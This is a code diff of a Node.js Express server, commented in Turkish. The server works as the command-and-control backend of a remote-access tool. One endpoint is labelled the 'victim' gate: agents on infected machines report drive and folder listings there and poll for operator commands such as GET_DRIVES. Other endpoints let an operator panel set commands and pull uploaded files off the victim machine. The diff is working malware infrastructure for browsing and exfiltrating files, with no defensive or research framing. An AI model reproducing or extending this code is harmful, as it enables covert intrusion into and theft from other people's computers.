@@ -6,45 +6,45 @@ app.use(express.json({ limit: '50mb' }));
 app.use(express.urlencoded({ limit: '50mb', extended: true }));
 
 let database = {
-    fileList: [], // Hem klasörleri hem dosyaları tutacak
-    currentPath: "Sürücüler", // O an hangi klasördeyiz?
-    lastUpdate: "Veri yok",
-    pendingCommand: "GET_DRIVES" // İlk açılışta sürücüleri iste
+    fileList: [],
+    currentPath: "Bilgisayarım",
+    lastUpdate: "Veri bekleniyor...",
+    pendingCommand: "GET_DRIVES"
 };
 
 let tempFileStorage = { fileName: "", data: null };
 
-// Agent (Client) buraya bağlanır
+app.get('/', (req, res) => res.send("AdminUlan Server Aktif!"));
+
+// Client (Kurban) Kapısı
 app.all('/agent', (req, res) => {
     if (req.method === 'POST') {
-        database.fileList = req.body.files;
-        database.currentPath = req.body.currentPath;
+        database.fileList = req.body.files || [];
+        database.currentPath = req.body.currentPath || "Bilgisayarım";
         database.lastUpdate = new Date().toLocaleString('tr-TR');
-        console.log("Dizin güncellendi:", database.currentPath);
     }
     res.json({ command: database.pendingCommand });
 });
 
-// Panel veriyi buradan çeker
-app.get('/panel', (req, res) => {
-    res.json(database);
+// Panel Veri Kapısı
+app.get('/panel', (req, res) => res.json(database));
+
+// Panel Komut Kapısı
+app.all('/panel/command', (req, res) => {
+    if (req.method === 'POST') {
+        database.pendingCommand = req.body.command;
+        return res.json({ status: "Success" });
+    }
+    res.json({ currentCommand: database.pendingCommand });
 });
 
-// Panel komut gönderir
-app.post('/panel/command', (req, res) => {
-    database.pendingCommand = req.body.command;
-    res.json({ status: "OK" });
-});
-
-// Dosya yükleme ve indirme kapıları
+// Dosya Transfer Kapıları
 app.post('/upload', (req, res) => {
     tempFileStorage = { fileName: req.body.fileName, data: req.body.data };
     database.pendingCommand = "IDLE";
-    res.json({ status: "Uploaded" });
+    res.json({ status: "OK" });
 });
 
-app.get('/download-file', (req, res) => {
-    res.json(tempFileStorage.data ? tempFileStorage : { status: "No file" });
-});
+app.get('/download-file', (req, res) => res.json(tempFileStorage));
 
-app.listen(PORT, () => console.log(`Server hazır: ${PORT}`));
+app.listen(PORT, () => console.log(`Server ${PORT} üzerinde çalışıyor.`));
